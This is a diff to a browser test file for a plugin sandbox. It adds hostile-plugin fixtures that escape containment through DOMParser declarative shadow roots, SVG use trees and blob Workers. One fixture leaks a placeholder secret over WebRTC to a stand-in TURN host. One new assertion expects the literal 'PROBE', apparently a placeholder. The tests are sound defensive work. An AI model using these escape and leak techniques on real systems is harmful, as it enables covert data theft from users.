@@ -526,6 +526,146 @@ const BARE_POISON_ATTACK_HTML = `<!doctype html>
   </body>
 </html>`;
 
+/**
+ * Round 11. The shell denies every *unsafe-named* door to a declarative shadow
+ * root — `document.write`, `Element.setHTMLUnsafe`, `ShadowRoot.setHTMLUnsafe`,
+ * `Document.parseHTMLUnsafe` — and relies on fragment parsing leaving
+ * `<template shadowrootmode>` inert everywhere else.
+ *
+ * `DOMParser.parseFromString(html, "text/html")` is not a fragment parse. It is
+ * a full document parse, and the HTML spec sets "allow declarative shadow roots"
+ * for it, precisely because the document it returns is inert and therefore not
+ * an injection sink on its own. It is not denied by the shell.
+ *
+ * Inert only lasts until the node moves. `document.adoptNode` *moves* the host
+ * element into the live document — it is not a clone, so `clonable` never comes
+ * into it — and the closed shadow root travels with it. Appending it connects
+ * the `<iframe>` inside that root to a browsing context.
+ *
+ * Nothing downstream can see it. The `MutationObserver` on `document` is never
+ * told about the inside of a shadow tree, `querySelectorAll` does not cross the
+ * boundary, `follow()` reads `element.shadowRoot` which is `null` for a closed
+ * root, and no `attachShadow` call ever happened for the wrapper to intercept.
+ * The child realm loads with `RTCPeerConnection` intact and reaches an
+ * attacker-chosen TURN host with the payload in the ICE username.
+ *
+ * `importNode` is included as the second ordering: same parse, a copy rather
+ * than a move.
+ */
+const DOMPARSER_SHADOW_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
+        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
+        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');&lt;/script&gt;";
+
+      function markup(tag) {
+        return "<div id='dsdhost'><template shadowrootmode='closed'>" +
+          "<iframe srcdoc=\\"" + CHILD.replace("TAG", tag) + "\\"></iframe>" +
+          "</template></div>";
+      }
+
+      function describe(host) {
+        if (!host) return "nohost";
+        // A DSD-aware parse consumes the <template> and leaves a closed root, so
+        // the host has no children and no readable shadowRoot.
+        return "kids=" + host.childNodes.length + ";shadow=" + (host.shadowRoot ? "open" : "none");
+      }
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        var notes = [];
+
+        try {
+          var moved = new DOMParser().parseFromString(markup("domparser-adopt"), "text/html");
+          var movedHost = moved.getElementById("dsdhost");
+          notes.push("adopt:" + describe(movedHost));
+          document.body.appendChild(document.adoptNode(movedHost));
+        } catch (error) {
+          notes.push("adopt:threw:" + (error && error.message));
+        }
+
+        try {
+          var copied = new DOMParser().parseFromString(markup("domparser-import"), "text/html");
+          var copiedHost = copied.getElementById("dsdhost");
+          notes.push("import:" + describe(copiedHost));
+          document.body.appendChild(document.importNode(copiedHost, true));
+        } catch (error) {
+          notes.push("import:threw:" + (error && error.message));
+        }
+
+        setTimeout(function () {
+          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
+        }, 600);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
+/**
+ * Round 11 probes: two realms the frame sweep never looks at.
+ *
+ * `<use>` instantiates a *closed, UA-owned* shadow tree — `use.shadowRoot` is
+ * null and `querySelectorAll` cannot reach into it — and `foreignObject` is an
+ * HTML integration point, so an `<iframe>` cloned into that tree would be a
+ * browsing context nothing here can find.
+ *
+ * A `blob:` `Worker` is a fresh realm too. It has no `RTCPeerConnection`, but it
+ * does have `fetch` and `WebSocket`, and the shell never touches it.
+ */
+const REALM_PROBE_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var CHILD = "&lt;script&gt;parent.parent.postMessage({exfil:1,type:'child'," +
+        "tag:'TAG',rtc:typeof RTCPeerConnection},'*');&lt;/script&gt;";
+      var notes = [];
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+        var url = event.data.imageUrl;
+
+        try {
+          var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+          svg.innerHTML =
+            "<g id='usesrc'><foreignObject width='50' height='50'><iframe srcdoc=\\"" +
+            CHILD.replace("TAG", "svg-use") + "\\"></iframe></foreignObject></g>" +
+            "<use href='#usesrc'></use>";
+          document.body.appendChild(svg);
+          notes.push("use:inserted");
+        } catch (error) {
+          notes.push("use:threw:" + (error && error.message));
+        }
+
+        try {
+          var source =
+            "self.postMessage('rtc=' + (typeof RTCPeerConnection));" +
+            "fetch(" + JSON.stringify(url) + ").then(" +
+            "function(){self.postMessage('fetch=sent')}," +
+            "function(){self.postMessage('fetch=blocked')});";
+          var blob = new Blob([source], { type: "text/javascript" });
+          var worker = new Worker(URL.createObjectURL(blob));
+          worker.onmessage = function (message) { notes.push("worker:" + message.data); };
+          worker.onerror = function () { notes.push("worker:error"); };
+          notes.push("worker:constructed");
+        } catch (error) {
+          notes.push("worker:threw:" + (error && error.message));
+        }
+
+        setTimeout(function () {
+          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
+        }, 900);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
 interface Outcomes {
   windowOpen: string;
   fetch: string;
@@ -905,6 +1045,89 @@ describe("a hostile plugin", () => {
     // The wrapper exists to force `mode: "open"`; "closed" means the plugin owns
     // the argument even when no frame report happens to arrive.
     expect(note).toBe("open");
+  });
+
+  it("cannot get a closed shadow root out of DOMParser", async () => {
+    const childReports: string[] = [];
+    let swept: string | null = null;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as {
+        exfil?: number;
+        type?: string;
+        tag?: string;
+        ice?: string;
+        note?: string;
+      };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=${data.ice}`);
+      }
+      if (data.type === "swept") {
+        swept = data.note ?? "";
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(DOMPARSER_SHADOW_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    const note = await waitFor(() => swept, "the DOMParser shadow attack to finish");
+
+    // Named in the message so a failure says which ordering got through and
+    // whether the child's WebRTC actually started gathering.
+    expect(`${childReports.join(" ")} | ${note}`).toBe(
+      " | adopt:kids=1;shadow=none import:kids=1;shadow=none",
+    );
+  });
+
+  it("cannot get a realm from an SVG use tree or a blob Worker", async () => {
+    const childReports: string[] = [];
+    let swept: string | null = null;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as {
+        exfil?: number;
+        type?: string;
+        tag?: string;
+        rtc?: string;
+        note?: string;
+      };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=${data.rtc}`);
+      }
+      if (data.type === "swept") {
+        swept = data.note ?? "";
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage(
+          { exfil: 1, type: "attack", imageUrl: `${location.origin}/pwa-icon-192.png` },
+          "*",
+        );
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(REALM_PROBE_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    const note = await waitFor(() => swept, "the realm probe to finish");
+
+    expect(`${childReports.join(" ")} | ${note}`).toBe("PROBE");
   });
 
   it("cannot leak a hostname through a resource hint in its markup", async () => {
